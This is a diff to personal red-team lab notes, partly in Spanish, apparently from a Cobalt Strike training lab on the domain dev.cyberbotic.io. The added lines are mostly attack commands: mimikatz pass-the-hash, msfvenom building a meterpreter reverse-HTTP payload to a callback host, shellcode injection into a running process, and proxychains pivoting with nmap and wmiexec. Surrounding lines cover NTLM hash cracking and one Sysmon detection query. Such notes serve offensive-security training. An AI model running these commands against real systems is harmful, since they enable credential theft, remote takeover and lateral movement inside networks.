@@ -392,6 +392,12 @@ pth DEV\user ntlm
 lo carga autmaaticamente
 ls \\maquina\c$
 
+mimikatz
+privilege::debug
+sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm: /run:"C:\windows\system32\cmd.exe"
+runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
+
+
 #OPSEC
 sysmon cmd.exe
 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="C:\\Windows\\System32\\cmd.exe" CommandLine="*\\\\.\\pipe\\*"
@@ -458,19 +464,39 @@ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -m 1000 NTLM
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -r rules\add-year.rule
 
 #Session Passing
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+Crear oyente HTTP
+spawn metasploit
 
+otra
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
+execute C:\Windows\System32\notepad.exe
+shinject 1492 x64 C:\Payloads\msf.bin
 
+al reves
+Attacks > Packages > Windows Executable (S) Raw Output x64
+post/windows/manage/shellcode_inject
+use post/windows/manage/shellcode_inject
+ 
+#Socks Proxies
+socks 1080
+ss -lpnt
+proxychains  sock4 127.0.0.1 localhost
+proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
+proxychains python3 /usr/local/bin/wmiexec.py CEV/user@ip
 
+#WindowsApps
+#Broweser sock proxy
 
+#Metasploit
+setg Proxies socks4:ip:1080
 
+#runas
+runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe"
 
-
-
-
-
-
-
-
+#Reverse Port Forward
 
 
 
